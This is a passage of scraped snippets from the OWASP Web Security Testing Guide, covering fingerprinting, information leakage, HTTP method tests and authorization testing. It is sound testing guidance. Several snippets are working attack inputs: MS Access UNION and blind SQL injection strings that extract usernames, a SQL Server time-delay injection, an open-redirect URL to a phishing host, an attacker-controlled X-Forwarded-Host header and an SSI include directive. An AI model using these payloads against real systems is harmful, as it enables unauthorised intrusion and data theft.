id=\"phpbb\"\n```\n\n----------------------------------------\n\nTITLE: Common Weak Passwords Example in Markdown\nDESCRIPTION: Examples of commonly used weak passwords that are frequently found in security breaches. These simple passwords represent high-security risks when allowed in applications.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`123456`, `password` and `qwerty`\n```\n\n----------------------------------------\n\nTITLE: Testing Arbitrary HTTP Methods\nDESCRIPTION: Demonstrates how to test for arbitrary HTTP methods, which some servers may treat as equivalent to GET. This can be useful for evading web application firewalls or filters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nFOO / HTTP/1.1\nHost: example.org\n```\n\n----------------------------------------\n\nTITLE: Identifying SQL Query in HTML Comments\nDESCRIPTION: Example of sensitive information (SQL query) leaked in an HTML comment. This could provide attackers insight into the database structure.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"table2\">\n  <div class=\"col1\">1</div><div class=\"col2\">Mary</div>\n  <div class=\"col1\">2</div><div class=\"col2\">Peter</div>\n  <div class=\"col1\">3</div><div class=\"col2\">Joe</div>\n\n<!-- Query: SELECT id, name FROM app.users WHERE active='1' -->\n\n</div>\n```\n\n----------------------------------------\n\nTITLE: Directory Fuzzing with GoBuster in Bash\nDESCRIPTION: Example command demonstrating how to use GoBuster for fuzzing directories. It uses a wordlist file 'endpoints.txt' to discover available directories on the target URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/C-Fuzzing.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngobuster dir -w endpoints.txt -u https://example.com\n```\n\n----------------------------------------\n\nTITLE: Detecting Custom Properties on Window Object\nDESCRIPTION: This self-executing function identifies custom properties added to the global window object by comparing with a clean window instance. It creates a temporary iframe to establish a baseline, then logs any custom key-value pairs that differ from the default window object.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n(() => {\n  // create an iframe and append to body to load a clean window object\n  const iframe = document.createElement('iframe');\n  iframe.style.display = 'none';\n  document.body.appendChild(iframe);\n\n  // get the current list of properties on window\n  const currentWindow = Object.getOwnPropertyNames(window);\n\n  // filter the list against the properties that exist in the clean window\n  const results = currentWindow.filter(\n    prop => !iframe.contentWindow.hasOwnProperty(prop)\n  );\n\n  // remove iframe\n  document.body.removeChild(iframe);\n\n  // log key-value entries that are different\n  results.forEach(key => console.log(`${key}: ${window[key]}`));\n})();\n```\n\n----------------------------------------\n\nTITLE: Attack Surface Detector Output Example with Rails Application\nDESCRIPTION: Example output from running the Attack Surface Detector CLI tool against OWASP RailsGoat application. The output shows detected endpoints, their HTTP methods, parameters, source files, and line numbers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for '<...>/railsgoat' with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines '6'-'9')\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines '29'-'38')\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines '19'-'27')\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines '5'-'17')\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '11'-'31')\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '9'-'11')\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '13'-'15')\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines '8'-'13')\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for '<...>/railsgoat'\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument\n```\n\n----------------------------------------\n\nTITLE: Example of Malicious URL for Flash Open Redirector Exploitation\nDESCRIPTION: Demonstrates the format of a malicious URL that exploits a Flash SWF file as an open redirector by passing a malicious URL as a FlashVar parameter.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html\n```\n\n----------------------------------------\n\nTITLE: Detecting MediaWiki through Generator Meta Tag\nDESCRIPTION: HTML meta tag revealing MediaWiki software and version. This generator tag is commonly found in MediaWiki-powered sites like Wikipedia.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"generator\" content=\"MediaWiki 1.21.9\" />\n```\n\n----------------------------------------\n\nTITLE: Exploitation of Parameter Binding in PL/SQL Gateway\nDESCRIPTION: This code shows how the PL/SQL Gateway processes a request with an unexpected parameter, revealing how parameter binding works. This mechanism can be exploited to inject arbitrary SQL code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\n..\n..\nif ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then\n rc__ := 2;\nelse\n null;\n orasso.wpg_session.init();\n orasso.home(FOO=>:FOO);\n..\n..\n```\n\n----------------------------------------\n\nTITLE: Detecting Sensitive Routes in JavaScript Configuration\nDESCRIPTION: Example of sensitive routes and internal IP addresses hardcoded in JavaScript configuration. This information could be used by attackers to target internal systems.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"application/json\">\n...\n\"runtimeConfig\":{\"BASE_URL_VOUCHER_API\":\"https://staging-voucher.victim.net/api\", \"BASE_BACKOFFICE_API\":\"https://10.10.10.2/api\", \"ADMIN_PAGE\":\"/hidden_administrator\"}\n...\n</script>\n```\n\n----------------------------------------\n\nTITLE: Specifying Character Encoding in HTML META Tag\nDESCRIPTION: Demonstrates how to specify the character encoding (ISO-8859-1) using an HTML META tag. This is an alternative method to declare the encoding when HTTP headers cannot be modified.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<META http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">\n```\n\n----------------------------------------\n\nTITLE: Retrieving Cached Content Using Google\nDESCRIPTION: Shows how to use the 'cache:' operator in Google to view previously indexed content that may have changed or been removed. This can be valuable for accessing historical versions of web pages.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\ncache:owasp.org\n```\n\n----------------------------------------\n\nTITLE: Using cURL to Test Arbitrary HTTP Methods\nDESCRIPTION: Shows how to use cURL to send requests with arbitrary HTTP methods, which can be useful for testing server responses to non-standard methods.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncurl -X FOO https://example.org\n```\n\n----------------------------------------\n\nTITLE: AWS CLI File Upload Command\nDESCRIPTION: Command to upload a file to an S3 bucket using AWS CLI\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\naws s3 cp arbitrary-file s3://bucket-name/path-to-save\n```\n\n----------------------------------------\n\nTITLE: Using GAU (Get All URLs) for Content Discovery\nDESCRIPTION: GAU collects URLs from multiple public archives, including the Wayback Machine and Common Crawl. This tool helps gather a comprehensive list of URLs associated with a target domain.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/A-Testing_Tools_Resource.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngau example.com\n```\n\n----------------------------------------\n\nTITLE: HTTP Response Containing Session Cookie\nDESCRIPTION: This example shows a successful HTTP response that includes a Set-Cookie header establishing a session identifier. The response demonstrates how the server assigns a secure session token after successful authentication.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nSet-Cookie: SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure\n```\n\n----------------------------------------\n\nTITLE: Basic PL/SQL NULL Test\nDESCRIPTION: Demonstrates a simple PL/SQL NULL procedure execution that helps verify if a database is functioning correctly.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nBEGIN\n  NULL;\n  END;\n  /\n```\n\n----------------------------------------\n\nTITLE: ActionScript Browser Navigation Call in Open Redirector\nDESCRIPTION: Shows how a Flash application might use the user-supplied FlashVar to navigate the browser to a potentially malicious URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_1\n\nLANGUAGE: actionscript\nCODE:\n```\ngetURL(_root.getURLValue,\"_self\");\n```\n\n----------------------------------------\n\nTITLE: Displaying WordPress Generator Meta Tag in HTML\nDESCRIPTION: HTML meta tag that reveals WordPress version information in the page source code. This tag is a common fingerprinting marker for WordPress installations.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"generator\" content=\"WordPress 3.9.2\" />\n```\n\n----------------------------------------\n\nTITLE: SQL Server Error Message Example\nDESCRIPTION: This shows a typical SQL Server error message that might be returned when a single quote character is injected into a query. These error messages can reveal important information about the database structure and query syntax.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_5\n\nLANGUAGE: txt\nCODE:\n```\nMicrosoft OLE DB Provider for SQL Server error '80040e14'\nUnclosed quotation mark before the character string '' '.\n/forgotpass.asp, line 15\n```\n\n----------------------------------------\n\nTITLE: Identifying Author Metadata in HTML\nDESCRIPTION: Example of an HTML META tag revealing the author's name. This information could be used by attackers to profile the application or target specific individuals.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<META name=\"Author\" content=\"Andrew Muller\">\n```\n\n----------------------------------------\n\nTITLE: Identifying SEO Keywords in HTML Metadata\nDESCRIPTION: Example of an HTML META tag containing SEO keywords. While not directly a security risk, this information could be used to profile the application.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<META name=\"keywords\" lang=\"en-us\" content=\"OWASP, security, sunshine, lollipops\">\n```\n\n----------------------------------------\n\nTITLE: Analyzing HTML DOCTYPE Declaration\nDESCRIPTION: Example of an HTML DOCTYPE declaration that includes version information and a DTD URL. This information can be used to profile the application.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"https://www.w3.org/TR/html4/strict.dtd\">\n```\n\n----------------------------------------\n\nTITLE: Testing Special Header Bypass - Normal Request\nDESCRIPTION: Initial request to establish baseline behavior without special headers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nGET / HTTP/1.1\nHost: www.example.com\n[...]\n```\n\n----------------------------------------\n\nTITLE: Amazon S3 Virtual Host Style URL Format\nDESCRIPTION: Format for accessing S3 buckets using virtual host style\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttps://bucket-name.s3.Region.amazonaws.com/key-name\n```\n\n----------------------------------------\n\nTITLE: Testing User Parameter for Operation Authorization in Password Change Function\nDESCRIPTION: This example demonstrates a URL where the user parameter might allow changing passwords for other users if proper authorization checks aren't implemented.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nhttps://foo.bar/changepassword?user=someuser\n```\n\n----------------------------------------\n\nTITLE: X-Forwarded-Host Header Bypass Request\nDESCRIPTION: An HTTP request demonstrating how to bypass Host header validation by using the X-Forwarded-Host header, which some applications may process instead of the Host header.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nGET / HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: www.attacker.com\n[...]\n```\n\n----------------------------------------\n\nTITLE: HTML Example of S3 Bucket Usage\nDESCRIPTION: Example showing how S3 bucket URLs might appear in HTML code\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n...\n<img src=\"https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\">\n...\n```\n\n----------------------------------------\n\nTITLE: Network Firewall Port Response Validation\nDESCRIPTION: Describes the expected network responses when probing ports to determine firewall presence. A RST packet response to SYN indicates no firewall, while filtered (no response) indicates firewall presence.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nSYN -> RST (closed ports) = likely no firewall\\nSYN -> no response (filtered) = likely firewall present\n```\n\n----------------------------------------\n\nTITLE: CakePHP Cookie Configuration in PHP\nDESCRIPTION: PHP code snippet showing how to configure the CakePHP session cookie name, demonstrating that cookie names can be customized, though this is less common than modifying HTTP headers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n/**\n* The name of CakePHP's session cookie.\n*\n* Note the guidelines for Session names states: \"The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\"\n* @link https://php.net/session_name\n*/\nConfigure::write('Session.cookie', 'CAKEPHP');\n```\n\n----------------------------------------\n\nTITLE: Blind SQL Injection with Time Delay\nDESCRIPTION: A blind SQL injection technique that uses WAITFOR DELAY to create a timing attack. If the condition is true, the query will pause for the specified time, allowing the attacker to infer information based on response time.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nif exists (select * from pubs..pub_info) waitfor delay '0:0:5'\n```\n\n----------------------------------------\n\nTITLE: Enumerating PHP Admin Paths\nDESCRIPTION: List of common PHP admin paths to check during penetration testing. These paths are frequently used for administrative interfaces in PHP-based applications.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n/phpinfo\n/phpmyadmin/\n/phpMyAdmin/\n/mysqladmin/\n/MySQLadmin\n/MySQLAdmin\n/login.php\n/logon.php\n/xmlrpc.php\n/dbadmin\n```\n\n----------------------------------------\n\nTITLE: Server Header Example\nDESCRIPTION: Example of a server header indicating load balancing configuration.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nServer: BIG-IP\n```\n\n----------------------------------------\n\nTITLE: ViewSettings Response - Legitimate User Access\nDESCRIPTION: Expected response when a legitimate user accesses their own settings, showing sensitive user data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\nHTTP1.1 200 OK\n[other HTTP headers]\n\n{\n  \"username\": \"example_user\",\n  \"email\": \"example@email.com\",\n  \"address\": \"Example Address\"\n}\n```\n\n----------------------------------------\n\nTITLE: URI Encoding/Decoding in JavaScript\nDESCRIPTION: JavaScript functions for encoding and decoding complete URIs while preserving reserved URL characters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/F-Leveraging_Dev_Tools.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nencodeURI()  // URI encode\ndecodeURI()  // URI decode\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Insecure Password Reset Token Generation\nDESCRIPTION: An example of an insecure way to generate password reset tokens using MD5 hash of email, which should be avoided in practice.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md#2025-04-22_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nmd5($email)\n```\n\n----------------------------------------\n\nTITLE: Basic MS Access SQL Query Example\nDESCRIPTION: Example of a basic SQL query vulnerable to injection in MS Access\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md#2025-04-22_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT [username],[password] FROM users WHERE [username]='$myUsername' AND [password]='$myPassword'\n```\n\n----------------------------------------\n\nTITLE: DNS Nameserver Lookup Using Host Command\nDESCRIPTION: Using the host command to identify nameservers for a domain, which is a prerequisite for attempting zone transfers to discover additional virtual hosts on the same IP address.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.\n```\n\n----------------------------------------\n\nTITLE: Including Files with SSI Include Directive in HTML\nDESCRIPTION: The include directive allows including the content of files or CGI script outputs. This can be used to include sensitive files or execute server-side scripts.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!--#include virtual=\"FILENAME\" -->\n```\n\n----------------------------------------\n\nTITLE: Findings Summary Table Format in Markdown\nDESCRIPTION: Example markdown table format for summarizing security findings, with columns for reference ID, title, and risk level.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/5-Reporting/01-Reporting_Structure.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n| Ref. ID |  Title | Risk Level |\n|:------------:|--------|------------|\n| 1 | User Authentication Bypass | High |\n```\n\n----------------------------------------\n\nTITLE: Using Linux namei Command to Check File Permissions\nDESCRIPTION: Example of using the namei command with the -l flag to recursively list file permissions for a specified path. This command is useful for auditing file permission settings during security testing.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ namei -l /PathToCheck/\n```\n\n----------------------------------------\n\nTITLE: Version Detection using SQL Server's @@version Variable\nDESCRIPTION: A simple query to retrieve the SQL Server version information, which can be used to identify the specific version of the database for targeted exploitation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\nselect @@version\n```\n\n----------------------------------------\n\nTITLE: Custom Header Example\nDESCRIPTION: Example of a non-standard HTTP header that could indicate debugging configuration.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\ndebug: false\n```\n\n----------------------------------------\n\nTITLE: Creating SWID Tag for Red Hat Enterprise Linux 8 in XML\nDESCRIPTION: This XML snippet shows how to create a SWID tag for an operating system. It includes details like the OS name, version, architecture, and language.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/5-Reporting/02-Naming_Schemes.md#2025-04-22_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<SoftwareIdentity\n                  xmlns=\"https://standards.iso.org/iso/19770/-2/2015/schema.xsd\"\n                  xmlns:xsi=\"https://www.w3.org/2001/XMLSchema-instance\"\n                  xsi:schemaLocation=\"https://standards.iso.org/iso/19770/-2/2015/schema.xsd\"\n                  xml:lang=\"en-US\"\n                  name=\"Red Hat Enterprise Linux\"\n                  tagId=\"com.redhat.RHEL-8-x86_64\"\n                  tagVersion=\"1\"\n                  version=\"8\"\n                  versionScheme=\"multipartnumeric\"\n                  media=\"(OS:linux)\">\n```\n\n----------------------------------------\n\nTITLE: Listing Key-Value Entries in Session Storage with JavaScript\nDESCRIPTION: This code iterates through all entries in the browser's sessionStorage, retrieves each key-value pair, and logs them to the console. Unlike localStorage, these entries are cleared when the browser tab/window is closed.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nfor (let i = 0; i < sessionStorage.length; i++) {\n  const key = sessionStorage.key(i);\n  const value = sessionStorage.getItem(key);\n  console.log(`${key}: ${value}`);\n}\n```\n\n----------------------------------------\n\nTITLE: Base64 Encoding/Decoding in JavaScript\nDESCRIPTION: Built-in JavaScript functions for encoding and decoding strings to/from base64 format.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/F-Leveraging_Dev_Tools.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nbtoa(\"string-to-encode\")  // encode to base64\natob(\"string-to-decode\")  // decode from base64\n```\n\n----------------------------------------\n\nTITLE: ActionScript 3.0 FlashVars Assignment\nDESCRIPTION: Shows how ActionScript 3.0 explicitly assigns FlashVar values to local variables, requiring developers to handle each variable individually.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_3\n\nLANGUAGE: actionscript\nCODE:\n```\nvar paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;\nvar var1:String = String(paramObj[\"var1\"]);\nvar var2:String = String(paramObj[\"var2\"]);\n```\n\n----------------------------------------\n\nTITLE: Identifying Hidden Admin Parameter in HTML\nDESCRIPTION: Example of a hidden HTML input field that may be used to enable admin functionality. Testers should look for similar fields in the source code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"hidden\" name=\"admin\" value=\"no\">\n```\n\n----------------------------------------\n\nTITLE: Recognizing Drupal Sites through Generator Meta Tag\nDESCRIPTION: HTML meta tag that reveals Drupal as the content management system with version information and link to Drupal's official website.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"Generator\" content=\"Drupal 7 (https://drupal.org)\" />\n```\n\n----------------------------------------\n\nTITLE: MS Access SQL Union Query with TOP Operator\nDESCRIPTION: Example showing how to use UNION and TOP operators to limit result sets in MS Access\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md#2025-04-22_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\n2'+UNION+SELECT+TOP+3+name+FROM+appsTable%00\n```\n\n----------------------------------------\n\nTITLE: Using Waybackurls for Content Discovery\nDESCRIPTION: Waybackurls fetches all URLs known to the Wayback Machine for a given domain, useful for reconnaissance. This command retrieves historical URLs for a domain to discover hidden content and endpoints.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/A-Testing_Tools_Resource.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nwaybackurls example.com\n```\n\n----------------------------------------\n\nTITLE: MS Access Blind SQL Injection Example\nDESCRIPTION: Complex query demonstrating blind SQL injection technique using multiple MS Access functions\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md#2025-04-22_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\n'%20AND%201=0%20OR%20'a'=IIF((select%20MID(LAST(username),1,1)%20from%20(select%20TOP%2010%20username%20from%20users))='a','a','b')%00\n```\n\n----------------------------------------\n\nTITLE: Specifying Character Encoding in HTTP Header\nDESCRIPTION: Shows how to specify the character encoding (UTF-8) in the HTTP Content-Type header. This informs the browser about the encoding scheme used for the web page content.\nSOURCE: 